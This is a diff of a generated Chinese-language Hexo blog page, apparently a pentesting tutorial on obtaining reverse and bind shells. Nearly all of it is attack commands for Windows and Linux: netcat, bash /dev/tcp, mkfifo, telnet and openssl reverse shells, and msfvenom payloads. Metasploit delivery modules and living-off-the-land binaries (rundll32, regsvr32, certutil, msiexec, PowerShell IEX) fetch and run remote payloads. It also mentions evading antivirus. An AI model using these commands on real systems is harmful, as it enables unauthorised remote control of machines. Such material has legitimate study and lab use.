@@ -58,7 +58,9 @@
     
 	<!-- mathjax -->
 	
-<meta name="generator" content="Hexo 5.4.2"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -185,20 +187,16 @@
 <li><p>正向Shell</p>
 <p>被控端：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666 -e cmd.exe     // -e shell环境重定向至6666端口</span><br></pre></td></tr></table></figure>
-
 <p>控制端：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.62 6666</span><br></pre></td></tr></table></figure>
-
 <p>原理：</p>
 <p>被控端将cmd.exe重定向到本地的6666端口, 控制端主动连接受害机的6666端口, 即可获得shell</p>
 </li>
 <li><p>反向shell</p>
 <p>控制端：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
-
 <p>被控端：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd.exe 192.168.1.227 6666</span><br></pre></td></tr></table></figure>
-
 <p>被控端将cmd.exe重定向到控制单的6666端口，控制单只需要监听本地的6666端口，即可获得shell</p>
 </li>
 </ol>
@@ -208,11 +206,9 @@
 <p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/rundll32">https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/rundll32</a></p>
 <p>通过Metasploit的SMB Delivery模块发起Rundll32攻击</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/smb_delivery</span><br><span class="line">set srvhost  msf服务ip</span><br><span class="line">set lhost smf服务ip</span><br><span class="line">set lport 4444</span><br><span class="line">exploite -j</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230105234537555.png" alt="image-20230105234537555"></p>
 <p>执行payload之后将下列payload在目标机中执行，这个攻击依赖于SMB服务，需要目标机开启才行</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe \\<span class="number">172</span>.<span class="number">16</span>.<span class="number">80</span>.<span class="number">136</span>\AeEcdf\test.dll,<span class="number">0</span></span><br></pre></td></tr></table></figure>
-
 <p>我这儿不知道为啥一直显示无法加载指定模块</p>
 </li>
 <li><p><code>Regsvr32.exe</code></p>
@@ -225,19 +221,16 @@
 <p>/s - 沉默; 不显示消息框</p>
 <p>通过msf的<code>web delivery</code>模块启动Regsvr32</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set srvhost msfip</span><br><span class="line">set lhost msfip</span><br><span class="line">set lport 6666</span><br><span class="line">set paylaod windows/meterpreter/reverse_tcp</span><br><span class="line">set target Regsvr32</span><br></pre></td></tr></table></figure>
-
 <p>该模块默认为python编写的exp，我们要改为想要执行的对应脚本语言写的payload</p>
 <p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106002437690.png" alt="image-20230106002437690"></p>
 <p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106002022492.png" alt="image-20230106002022492"></p>
 </li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /n /u /i:http://172.16.80.136:8080/ExPIVc.sct scrobj.dll</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li><p><code>Certuil.exe</code></p>
 <p><code>Certuil.exe</code>是作为证书服务的一部分安装的命令行程序, 我们可以用这个工具在计算机中执行恶意的exe文件以获得meterpreter会话</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.80.136 lport=1234 -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">python3 -m http.server 8000</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -splite -f http://172.16.80.136/shell.exe shell.exe &amp; shell.exe</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -splite -f http://172.16.80.136:8000/shell.exe shell.exe delete</span><br></pre></td></tr></table></figure>
-
 <p>这里的利用就是通过certutil.exe下载指定ip中的恶意shell文件并执行，执行完后清除</p>
 <p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106003311845.png" alt="image-20230106003311845"></p>
 </li>
@@ -250,19 +243,18 @@
 <p>这个PoweCat需要有免杀能力</p>
 <p>攻击方先下载并启动一个服务器</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:/github.com/besimorhino/powercat.git</span><br><span class="line"> </span><br><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
-
 <p>之后监听端口等待接收反弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
-
 <p>靶机执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.92.128:8000/powercat.ps1&#x27;);powercat -c 192.168.92.128 -p 6666 -e cmd&quot;</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.92.128:8000/powercat.ps1&#x27;);powercat -c 192.168.92.128 -p 6666 -e cmd&quot;</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>Msiexec.exe</code></p>
 <p>Windows OS 安装有一个Windows安装引擎，MSI包使用msiexe.exe来解释安装</p>
 <p>首先使用msf生成恶意的msi文件，并放到服务器上</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.92.128 lport=6666 -f msi &gt; shell.msi</span><br><span class="line"> </span><br><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
-
 <p>接着受害机执行msiexe下载指定恶意文件，触发反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec.exe /q /i http://ip/shell.msi</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec.exe /q /i http://ip/shell.msi</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>Metasploit.exe</code></p>
 <p>依然是通过msf生成一个恶意exe</p>
 <p><img src="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/image-20230106121141463.png" alt="image-20230106121141463"></p>
@@ -278,51 +270,48 @@
 <p>与Windows是一样的，不同点就是shell执行环境这里是bash</p>
 <p>通常情况下被控端：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666 -e /bin/sh</span><br></pre></td></tr></table></figure>
-
 <p>控制端</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip 6666</span><br></pre></td></tr></table></figure>
-
 <p>但是在某些版本的nc处于安全考虑是没有-e参数的，这种情况下如何利用呢？</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.92.128 6666 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
-
 <blockquote>
 <p> 原理：mkfifo命令首先创建了一个管道，cat将管道里面的内容输出传递给/bin/sh，-i创建一个shell环境，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc传到该管道，由此形成了一个回路</p>
 <p>/tmp/f 管道 =&gt; sh =&gt; nc =&gt; /tmp/f</p>
 </blockquote>
 <p>另一种方式为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
-
 <p>mknod 创建字符设备文件和块设备文件</p>
 <p>backpipe将其中的输入重定向到nc的标准输入当中，并将结果输出通过管道传给bash环境并执行，标准输出和错误输出结果再回传给backpipe</p>
 </li>
 <li><p><strong>Bash</strong></p>
 <p>被控端：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt;/dev/tcp/ip/port &lt;&amp;1</span><br></pre></td></tr></table></figure>
-
 <p>原理：</p>
 <blockquote>
 <p>首先<code>bash -i &gt; /dev/tcp/ip/port</code>将被控端交互式shell的输出结果重定向到控制端，接着控制端<code>bash -i &lt; /deb/tcp/ip/port</code> 将控制端的输出重定向到被控端的bash环境中执行。最后将其整合在一起，我们需要的是被控端的bash执行，控制端能输入和显示输出</p>
 </blockquote>
 <p>不适用bash的方式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> exec 5&lt;&gt;/dev/tcp/ip/6666,cat&lt;&amp;5 | while read line; do $line 2&gt;&amp;5&gt;&amp;5;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-
 <p><code>&lt;&gt;</code>表示可读可写，这里也就是先建立一个tcp通过并重定向至5，将5中的内容输出给while循环，循环依次接收数据并执行，最终再将输出重定向回tcp通道</p>
 </li>
 <li><p><code>Telnet</code></p>
 <p>攻击机：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
-
 <p>目标机：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f a &amp;&amp; mknod a p &amp;&amp; telnet ip 6666 0&lt;a | /bin/bash 1&gt;a</span><br><span class="line"> rm -f a;mknod a p;telnet 192.168.92.128 6666 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f a &amp;&amp; mknod a p &amp;&amp; telnet ip 6666 0&lt;a | /bin/bash 1&gt;a</span><br><span class="line"> rm -f a;mknod a p;telnet 192.168.92.128 6666 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><code>Openssl</code></p>
 <p>openssl反弹443端口，厂商一般都有流量监控设备，直接明文传输会被审查到</p>
 <ol>
 <li><p>在靶机上生成密钥文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>在远程攻击机上启动监视器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 443</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 443</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>在目标机上反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s;/bin/sh -i &lt; /tmp/s 2&gt;&amp;1 |openssl s_client -quiet -connect ip:6666 &gt; /tmp/s;rm /tmp/s</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s;/bin/sh -i &lt; /tmp/s 2&gt;&amp;1 |openssl s_client -quiet -connect ip:6666 &gt; /tmp/s;rm /tmp/s</span><br></pre></td></tr></table></figure>
+</li>
 </ol>
 </li>
 </ul>
